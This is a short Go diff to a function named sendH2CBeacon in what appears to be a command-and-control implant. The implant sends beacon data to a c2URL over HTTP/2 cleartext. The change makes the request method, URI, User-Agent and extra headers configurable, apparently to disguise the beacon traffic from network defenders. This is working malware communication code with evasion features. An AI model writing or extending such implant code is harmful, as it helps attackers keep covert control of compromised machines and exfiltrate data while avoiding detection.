@@ -41,12 +41,22 @@ func sendH2CBeacon(body []byte) []byte {
 
 		httpURL := "http://" + strings.TrimPrefix(c2URL, "h2c://")
 
-		req, err := http.NewRequest(BeaconMethod, httpURL+BeaconURI, bytes.NewReader(body))
+		method := getActiveBeaconMethodFromConfig()
+		if method == "" {
+			method = "POST"
+		}
+		req, err := http.NewRequest(method, httpURL+getActiveBeaconURIFromConfig(), bytes.NewReader(body))
 		if err != nil {
 			continue
 		}
 		req.Header.Set("Content-Type", "application/json")
-		req.Header.Set("User-Agent", UserAgent)
+		req.Header.Set("User-Agent", getActiveUserAgentFromConfig())
+		for k, v := range getActiveHeaders() {
+			if strings.EqualFold(k, "Content-Type") || strings.EqualFold(k, "User-Agent") {
+				continue
+			}
+			req.Header.Set(k, v)
+		}
 
 		// Upgrade to HTTP/2 via h2c (Upgrade: h2c)
 		req.Header.Set("Upgrade", "h2c")
